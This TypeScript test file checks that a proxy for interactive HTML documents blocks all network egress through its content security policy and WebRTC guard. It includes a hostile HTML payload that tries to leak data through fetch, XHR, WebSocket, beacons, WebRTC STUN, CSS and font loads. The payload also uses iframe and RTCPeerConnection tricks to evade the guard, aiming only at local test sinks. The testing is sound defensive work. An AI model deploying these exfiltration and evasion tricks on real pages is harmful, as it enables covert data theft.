/** The raw control proves that hostile scripts and sinks work; the guarded document must run with zero egress.
 * Chromium follows editor-webrtc-egress: optional locally, mandatory with WICKED_EGRESS_PROBE=required. */
import { createSocket } from 'node:dgram';
import { mkdtempSync, rmSync } from 'node:fs';
import { createServer, request, type Server } from 'node:http';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { brotliCompressSync, deflateSync, gzipSync } from 'node:zlib';
import Fastify, { type FastifyInstance } from 'fastify';
import type { Browser } from 'playwright';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { registerFrameGuard } from '../src/api/frame-guard.js';
import { documentCsp, INLINE_ONLY_POLICY, requestOrigin, shellCsp } from '../src/editors/csp.js';
import { guardBundle, MAX_INLINE_SCRIPTS } from '../src/editors/webrtc-guard.js';
import { DOCUMENT_BODY_MAX, registerInteractiveProxy } from '../src/interactive/proxy-routes.js';
import type { InteractiveBridgePool } from '../src/interactive/bridge-pool.js';
import type { CoreAdapter } from '../src/core/adapter.js';
import type { ProjectSettingsStore } from '../src/projects/settings.js';

const PREFIX = '/api/v1/projects/default/interactive';
const LIMIT = 16 * 1024 * 1024;
const POLICY = "default-src 'none'; script-src {SCRIPTS}; style-src 'unsafe-inline' 'self'; img-src data: blob: 'self'; media-src blob: 'self'; font-src data: 'self'; connect-src 'none'; frame-src 'none'; child-src 'none'; worker-src 'none'; form-action 'none'; base-uri 'none'; manifest-src 'none'";
const HTML = '<!doctype html><p>héllo</p><script>window.ok=1</script>';
const DATA = '<script type="application/json" id="wi-data">{ "html": "<b>é</b>", "n": 1 }</script>';
interface Fixture { body: Buffer; headers?: Record<string, string | string[]>; status?: number }
const fixtures = new Map<string, Fixture>();
const mediaHits = new Set<string>();
let dir: string;
let upstream: Server;
let app: FastifyInstance;
let origin: string;
const logLines: string[] = [];
const poolFor = (server: Server) => ({ ensure: async () => ({ host: '127.0.0.1', port: (server.address() as { port: number }).port, pid: 0 }) }) as unknown as InteractiveBridgePool;
const settings = { get: () => ({}) } as unknown as ProjectSettingsStore;

beforeAll(async () => {
  dir = mkdtempSync(join(tmpdir(), 'crew-document-egress-'));
  upstream = createServer((req, res) => {
    const path = (req.url ?? '/').split('?')[0]!;
    mediaHits.add(path);
    const f = fixtures.get(path) ?? { body: Buffer.from(HTML) };
    res.writeHead(f.status ?? 200, { 'content-type': 'text/html; charset=utf-8', ...f.headers });
    res.end(f.body);
  });
  await new Promise<void>((r) => upstream.listen(0, '127.0.0.1', r));
  app = Fastify({ logger: { level: 'warn', stream: { write: (line: string) => { logLines.push(line); } } } });
  registerFrameGuard(app, { allowedOrigins: [] });
  registerInteractiveProxy(app, {} as CoreAdapter, { pool: poolFor(upstream), settings, stateHome: dir });
  app.get('/shell', async (req, reply) => {
    const src = (req.query as { src: string }).src;
    return reply.header('Content-Security-Policy', shellCsp(requestOrigin(req))).type('text/html').send(
      `<body><script>window.R=[];window.V=[];addEventListener('message',function(e){if(e.data.probe)R.push(e.data.probe);if(e.data.violation)V.push(e.data.violation)});var f=document.createElement('iframe');f.setAttribute('sandbox','allow-scripts');f.src=${JSON.stringify(src)};document.body.appendChild(f)</script>`,
    );
  });
  app.get(`${PREFIX}/raw-control`, async (_req, reply) => reply.header('Content-Security-Policy', 'sandbox allow-scripts').type('text/html').send(fixtures.get('/hostile')!.body));
  origin = await app.listen({ port: 0, host: '127.0.0.1' });
});
afterAll(async () => {
  await app?.close();
  await new Promise<void>((r) => upstream.close(() => r()));
  rmSync(dir, { recursive: true, force: true });
});
const get = (path: string, method: 'GET' | 'HEAD' = 'GET') => app.inject({ method, url: `${PREFIX}${path}` });
const cspText = (csp: unknown): string => Array.isArray(csp) ? csp.join(', ') : String(csp);
function policyIs(csp: unknown, scripts = "'none'"): void {
  const text = cspText(csp);
  expect(text).toContain(POLICY.replace('{SCRIPTS}', scripts));
  expect(text).toContain(`, ${INLINE_ONLY_POLICY}`);
  expect(text).toContain('sandbox allow-scripts');
  expect(text).toContain("frame-ancestors 'self'");
}

describe('proxied document policy (no browser)', () => {
  it('pins the exact policy and cap, deduplicates hashes, and grants no scripts without hashes', () => {
    expect(DOCUMENT_BODY_MAX).toBe(LIMIT);
    expect(documentCsp([])).toBe(POLICY.replace('{SCRIPTS}', "'none'"));
    expect(documentCsp(['abc=', 'def=', 'abc='])).toBe(POLICY.replace('{SCRIPTS}', "'sha256-abc=' 'sha256-def='"));
  });
  it('guards scripts, preserves upstream CSP and JSON bytes, and replaces stale headers', async () => {
    fixtures.set('/guard', { body: Buffer.from(HTML + DATA), headers: { etag: '"old"', 'last-modified': 'Tue, 01 Jan 2030 00:00:00 GMT', 'cache-control': 'public', 'content-security-policy': ["img-src 'self'", "object-src 'none'"] } });
    const res = await get('/guard');
    const guarded = guardBundle(Buffer.from(HTML + DATA));
    expect(res.rawPayload).toEqual(guarded.body);
    expect(res.body).toContain(DATA);
    policyIs(res.headers['content-security-policy'], guarded.scriptHashes.map((h) => `'sha256-${h}'`).join(' '));
    expect(cspText(res.headers['content-security-policy'])).toContain("img-src 'self', object-src 'none', sandbox allow-scripts");
    expect(res.headers['etag']).toBeUndefined();
    expect(res.headers['last-modified']).toBeUndefined();
    expect(res.headers['cache-control']).toBe('no-store');
    expect(res.headers['x-dns-prefetch-control']).toBe('off');
    expect(res.headers['referrer-policy']).toBe('no-referrer');
    expect(res.headers['x-content-type-options']).toBe('nosniff');
  });
  it.each([['gzip', gzipSync], ['br', brotliCompressSync], ['deflate', deflateSync]] as const)('decodes %s and serves identity with its new byte length', async (encoding, compress) => {
    fixtures.set('/encoded', { body: compress(Buffer.from(HTML)), headers: { 'content-encoding': encoding } });
    const res = await get('/encoded');
    expect(res.statusCode).toBe(200);
    expect(res.rawPayload).toEqual(guardBundle(Buffer.from(HTML)).body);
    expect(res.headers['content-encoding']).toBeUndefined();
    expect(res.headers['transfer-encoding']).toBeUndefined();
    expect(res.headers['content-length']).toBe(String(res.rawPayload.length));
  });
  it('leaves attachment bytes and headers alone, including compressed exports and etag', async () => {
    const body = gzipSync(Buffer.from(HTML));
    fixtures.set('/download', { body, headers: { 'content-disposition': 'Attachment; filename="doc.html"', 'content-encoding': 'gzip', etag: '"export"', 'cache-control': 'private', 'content-length': String(body.length) } });
    const res = await get('/download');
    expect(res.rawPayload).toEqual(body);
    expect(res.headers['content-encoding']).toBe('gzip');
    expect(res.headers['etag']).toBe('"export"');
    expect(res.headers['cache-control']).toBe('private');
    expect(String(res.headers['content-security-policy'])).not.toContain("connect-src 'none'");
  });
  it('leaves non-HTML bytes and validators untouched', async () => {
    const body = gzipSync(Buffer.from('arbitrary bytes'));
    fixtures.set('/binary', { body, headers: { 'content-type': 'application/octet-stream', 'content-encoding': 'gzip', etag: '"binary"' } });
    const res = await get('/binary');
    expect(res.rawPayload).toEqual(body);
    expect(res.headers['etag']).toBe('"binary"');
    expect(res.headers['content-encoding']).toBe('gzip');
    expect(String(res.headers['content-security-policy'])).not.toContain('sandbox');
  });
  it('HEAD has no script grants and no rewritten body', async () => {
    fixtures.set('/head', { body: Buffer.from(HTML), headers: { 'content-length': String(Buffer.byteLength(HTML)) } });
    const res = await get('/head', 'HEAD');
    policyIs(res.headers['content-security-policy']);
    expect(res.rawPayload.length).toBe(0);
  });
  it.each(['iso-8859-1', '"windows-1252"'])('keeps %s bytes untouched and disables scripts', async (charset) => {
    const body = Buffer.from('<p>caf\xe9</p><script>window.x=1</script>', 'latin1');
    fixtures.set('/charset', { body, headers: { 'content-type': `text/html; charset=${charset}` } });
    const res = await get('/charset');
    expect(res.rawPayload).toEqual(body);
    policyIs(res.headers['content-security-policy']);
  });
  it('accepts a case-insensitive UTF-8 charset', async () => {
    fixtures.set('/utf8', { body: Buffer.from(HTML), headers: { 'content-type': 'Text/HTML; Charset="UTF-8"' } });
    expect((await get('/utf8')).rawPayload).toEqual(guardBundle(Buffer.from(HTML)).body);
    fixtures.set('/utf8-alias', { body: Buffer.from(HTML), headers: { 'content-type': 'text/html; charset=utf8' } });
    expect((await get('/utf8-alias')).rawPayload).toEqual(guardBundle(Buffer.from(HTML)).body);
  });
  it('renders the original body with scripts off past MAX_INLINE_SCRIPTS', async () => {
    const body = Buffer.from('<script>window.x=1</script>'.repeat(MAX_INLINE_SCRIPTS + 1));
    fixtures.set('/scripts', { body });
    const before = logLines.length;
    const res = await get('/scripts');
    expect(logLines.slice(before).filter((l) => /inline scripts/.test(l))).toHaveLength(1);
    expect(res.rawPayload).toEqual(body);
    policyIs(res.headers['content-security-policy']);
  });
  it.each(['identity', 'gzip'])('refuses a body over the cap (%s), without a partial document', async (encoding) => {
    const body = Buffer.alloc(LIMIT + 1, 'x');
    fixtures.set('/huge', { body: encoding === 'gzip' ? gzipSync(body) : body, headers: { 'content-encoding': encoding } });
    const res = await get('/huge');
    expect(res.statusCode).toBe(502);
    expect(res.json()).toMatchObject({ error: expect.stringMatching(/exceeds|limit|large/i) });
    expect(res.body.length).toBeLessThan(1024);
  });
  it.each(['zstd', 'gzip'])('refuses unsupported or corrupt encoding (%s)', async (encoding) => {
    fixtures.set('/bad', { body: Buffer.from(HTML), headers: { 'content-encoding': encoding } });
    const res = await get('/bad');
    expect(res.statusCode).toBe(502);
    expect(res.json()).toMatchObject({ error: expect.stringMatching(/encoding|decode/i) });
  });
  it('keeps the 5xx sanitizer and disables scripts on an HTML error', async () => {
    fixtures.set('/error', { status: 503, body: Buffer.from('<p>failed /home/person/private/doc.html</p><script>bad()</script>') });
    const res = await get('/error');
    expect(res.statusCode).toBe(503);
    expect(res.body).not.toContain('/home/person');
    expect(res.body).not.toContain('Object.defineProperty');
    policyIs(res.headers['content-security-policy']);
  });
  it('streams SSE before the upstream ends', async () => {
    const streaming = createServer((_req, res) => { res.writeHead(200, { 'content-type': 'text/event-stream' }); res.write('data: first\n\n'); });
    await new Promise<void>((r) => streaming.listen(0, '127.0.0.1', r));
    const a = Fastify();
    registerInteractiveProxy(a, {} as CoreAdapter, { pool: poolFor(streaming), settings, stateHome: dir });
    const url = await a.listen({ port: 0, host: '127.0.0.1' });
    try {
      const chunk = await new Promise<string>((resolve, reject) => {
        const q = request(`${url}${PREFIX}/sse`, (res) => res.once('data', (c: Buffer) => { resolve(c.toString()); q.destroy(); }));
        q.setTimeout(3000, () => { q.destroy(); reject(new Error('SSE buffered')); });
        q.on('error', reject);
        q.end();
      });
      expect(chunk).toBe('data: first\n\n');
    } finally { await a.close(); streaming.closeAllConnections(); await new Promise<void>((r) => streaming.close(() => r())); }
  });
});

async function udpSink() {
  const socket = createSocket('udp4');
  let hits = 0;
  socket.on('message', () => { hits++; });
  await new Promise<void>((r) => socket.bind(0, '127.0.0.1', r));
  return { port: socket.address().port, hits: () => hits, close: () => socket.close() };
}
function hostile(sink: string, ports: Record<string, number>): string {
  const rtc = `function rtc(name){try{var pc=new RTCPeerConnection({iceServers:[{urls:'stun:127.0.0.1:'+PORTS[name]}]});pc.createDataChannel('x');pc.createOffer().then(function(o){return pc.setLocalDescription(o)})}catch(e){}}`;
  const js = `var PORTS=${JSON.stringify(ports)};${rtc}
function report(m){top.postMessage({probe:m},'*')}
if(location.protocol==='about:'||location.protocol==='blob:'){report('child-ran');rtc(location.protocol==='about:'?'srcdoc':'blob')}else{
report('ran');var sink=${JSON.stringify(sink)};
try{fetch(sink+'/fetch').catch(function(){})}catch(e){}
try{var x=new XMLHttpRequest();x.open('GET',sink+'/xhr');x.send()}catch(e){}
try{new WebSocket(sink.replace('http:','ws:')+'/websocket')}catch(e){}
try{new EventSource(sink+'/eventsource')}catch(e){}
try{navigator.sendBeacon(sink+'/beacon','leak')}catch(e){}
rtc('top');var saved=window.RTCPeerConnection;try{delete window.RTCPeerConnection;Object.defineProperty(window,'RTCPeerConnection',{value:saved})}catch(e){}rtc('restore');
var self=document.currentScript.textContent;var child='<scr'+'ipt>'+self+'</scr'+'ipt>';var f=document.createElement('iframe');f.srcdoc=child;document.body.appendChild(f);
var b=document.createElement('iframe');b.src=URL.createObjectURL(new Blob([child],{type:'text/html'}));document.body.appendChild(b);
crypto.subtle.digest('SHA-256',new TextEncoder().encode(self)).then(function(d){var s=document.createElement('script');s.src=sink+'/script';s.integrity='sha256-'+btoa(String.fromCharCode.apply(null,new Uint8Array(d)));s.crossOrigin='anonymous';document.body.appendChild(s);report('external-added')});
}`;
  const module = `var PORTS=${JSON.stringify(ports)};${rtc}rtc('module');top.postMessage({probe:'module-ran'},'*');`;
  return `<!doctype html><style>@font-face{font-family:leak;src:url('${sink}/font')}body{font-family:leak;background-image:url('${sink}/css')}</style><body>font probe<img src="${sink}/img"><script>${js}</script><script type="module">${module}</script>`;
}

describe('proxied documents: Chromium egress and real document shapes', () => {
  let browser: Browser | null = null;
  let unavailable = '';
  beforeAll(async () => {
    try { const { chromium } = await import('playwright'); browser = await chromium.launch(); }
    catch (err) { unavailable = (err instanceof Error ? err.message : String(err)).split('\n')[0]!; }
  });
  afterAll(async () => { await browser?.close(); });
  const needBrowser = (skip: () => void): void => {
    if (browser !== null) return;
    if (process.env['WICKED_EGRESS_PROBE'] === 'required') throw new Error(`WICKED_EGRESS_PROBE=required but Chromium did not start: ${unavailable}`);
    console.warn(`[egress probe] skipped: no Chromium (${unavailable}). Run \`npx playwright install --only-shell chromium\`.`);
    skip();
  };
  async function load(path: string) {
    const page = await browser!.newPage();
    try {
      await page.goto(`${origin}/shell?src=${encodeURIComponent(path)}`);
      await page.waitForFunction("window.R.includes('ran')", undefined, { timeout: 10_000 });
      await page.waitForFunction("window.R.includes('external-added')", undefined, { timeout: 10_000 });
      await page.waitForTimeout(1800);
      return await page.evaluate('window.R') as string[];
    } finally { await page.close(); }
  }
  it('raw positive control reaches every sink; the proxy sends zero HTTP and UDP while scripts run', async (ctx) => {
    needBrowser(() => ctx.skip());
    const names = ['top', 'restore', 'srcdoc', 'blob', 'module'];
    const sinks = await Promise.all(names.map(() => udpSink()));
    const hits = new Set<string>();
    const http = createServer((req, res) => { hits.add(req.url ?? ''); res.writeHead(200, { 'access-control-allow-origin': '*', 'content-type': 'text/javascript' }); res.end('/* sink */'); });
    http.on('upgrade', (req, socket) => { hits.add(req.url ?? ''); socket.destroy(); });
    await new Promise<void>((r) => http.listen(0, '127.0.0.1', r));
    fixtures.set('/hostile', { body: Buffer.from(hostile(`http://127.0.0.1:${(http.address() as { port: number }).port}`, Object.fromEntries(names.map((n, i) => [n, sinks[i]!.port])))) });
    try {
      const raw = await load(`${PREFIX}/raw-control`);
      expect(raw).toContain('module-ran');
      for (const name of ['fetch', 'xhr', 'websocket', 'eventsource', 'beacon', 'img', 'css', 'font', 'script']) expect(hits.has(`/${name}`), `raw HTTP ${name}: ${[...hits]}`).toBe(true);
      for (const [i, name] of names.entries()) expect(sinks[i]!.hits(), `raw UDP ${name}`).toBeGreaterThan(0);
      hits.clear();
      const before = sinks.map((s) => s.hits());
      const guarded = await load(`${PREFIX}/hostile`);
      expect(guarded).toContain('ran');
      expect(guarded).toContain('module-ran');
      expect(hits.size, `guarded HTTP: ${[...hits]}`).toBe(0);
      for (const [i, name] of names.entries()) expect(sinks[i]!.hits() - before[i]!, `guarded UDP ${name}`).toBe(0);
    } finally { for (const s of sinks) s.close(); http.closeAllConnections(); await new Promise<void>((r) => http.close(() => r())); }
  }, 60_000);
  it('toggle and demo scripts run, same-origin video/poster/image load without CSP violations, and JSON stays intact', async (ctx) => {
    needBrowser(() => ctx.skip());
    // A video element can play PCM WAV, so this needs neither a downloaded fixture nor a media encoder.
    const wav = Buffer.alloc(44 + 16000);
    wav.write('RIFF'); wav.writeUInt32LE(wav.length - 8, 4); wav.write('WAVEfmt ', 8); wav.writeUInt32LE(16, 16); wav.writeUInt16LE(1, 20); wav.writeUInt16LE(1, 22); wav.writeUInt32LE(8000, 24); wav.writeUInt32LE(16000, 28); wav.writeUInt16LE(2, 32); wav.writeUInt16LE(16, 34); wav.write('data', 36); wav.writeUInt32LE(16000, 40);
    fixtures.set('/clip.wav', { body: wav, headers: { 'content-type': 'audio/wav' } });
    const png = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+aPf8AAAAASUVORK5CYII=', 'base64');
    for (const p of ['/poster.png', '/image.png']) fixtures.set(p, { body: png, headers: { 'content-type': 'image/png' } });
    const observe = `<script>addEventListener('securitypolicyviolation',function(e){top.postMessage({violation:e.violatedDirective},'*')});</script>`;
    fixtures.set('/toggle', { body: Buffer.from(`<body><button id="thanks-toggle">Thanks</button><p id="thanks" hidden>Thanks!</p>${observe}<script>const toggle=document.getElementById('thanks-toggle');toggle.addEventListener('click',()=>{document.getElementById('thanks').hidden=false});</script>${DATA}`) });
    fixtures.set('/demo', { body: Buffer.from(`<body><video preload="auto" poster="${PREFIX}/poster.png" src="${PREFIX}/clip.wav"></video><img src="${PREFIX}/image.png"><ol id="chapters"></ol>${observe}<script>(()=>{document.getElementById('chapters').textContent='Chapter 1'})()</script>${DATA}`) });
    const page = await browser!.newPage();
    try {
      await page.goto(`${origin}/shell?src=${encodeURIComponent(`${PREFIX}/toggle`)}`);
      const toggle = page.frameLocator('iframe');
      await toggle.locator('#thanks-toggle').click();
      await expect.poll(() => toggle.locator('#thanks').isVisible()).toBe(true);
      expect(await page.evaluate('window.V')).toEqual([]);
      await page.goto(`${origin}/shell?src=${encodeURIComponent(`${PREFIX}/demo`)}`);
      const frame = page.frames().find((f) => f.url().endsWith('/demo'))!;
      await frame.waitForFunction("document.querySelector('video').readyState >= 2 && document.querySelector('img').naturalWidth > 0 && document.querySelector('#chapters').textContent === 'Chapter 1'");
      expect(await page.evaluate('window.V')).toEqual([]);
      for (const p of ['/clip.wav', '/poster.png', '/image.png']) expect(mediaHits.has(p), p).toBe(true);
      expect((await get('/demo')).body).toContain(DATA);
    } finally { await page.close(); }
  }, 60_000);
});
